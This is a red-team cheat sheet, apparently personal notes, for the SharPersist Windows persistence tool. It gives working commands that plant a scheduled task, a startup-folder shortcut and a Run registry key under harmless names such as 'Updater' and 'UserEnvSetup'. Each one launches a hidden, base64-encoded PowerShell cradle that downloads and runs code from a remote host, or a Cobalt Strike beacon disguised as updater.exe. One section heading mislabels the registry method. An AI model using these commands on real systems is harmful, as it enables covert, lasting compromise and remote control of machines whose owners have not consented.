# SharPersist

## Commands
``````
`-t` is the desired persistence technique.
`-c` is the command to execute.
`-a` are any arguments for that command.
`-n` is the name of the task.
`-m` is to add the task (you can also `remove`, `check` and `list`).
`-o` is the task frequency.

Startup Folder
`-f` is the filename to save as.

RunKey
`-k` is the registry key to modify.
`-v` is the name of the registry key to create.
``````

## [[Priv Esc/Scheduled Tasks]]
Create a scheduled task with:
* Powershell x64 bit
* Name: Updater
* hourly execute
``````powershell
$str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'

[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
``````

## [[Startup Folder]]
Add to startup folder
Creates a file called UserEnvSetup in the folowing path:
`%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\UserEnvSetup.lnk`

⚠ Consider the spaces in "Start Menu"

``````powershell 
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -f "UserEnvSetup" -m add
``````

## [[Startup Folder]]
Create a new regkey with:
* Registry key name: Updater
* Registry key to modify: hkcurun | hkcurunonce (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)

``````powershell
cd C:\ProgramData
upload C:\Payloads\beacon-http.exe
mv beacon-http.exe updater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
``````

```meta
requirements: 
results: persistence
oss: #win 
source: https://github.com/mandiant/SharPersist
description: Windows persistence toolkit written in C#
```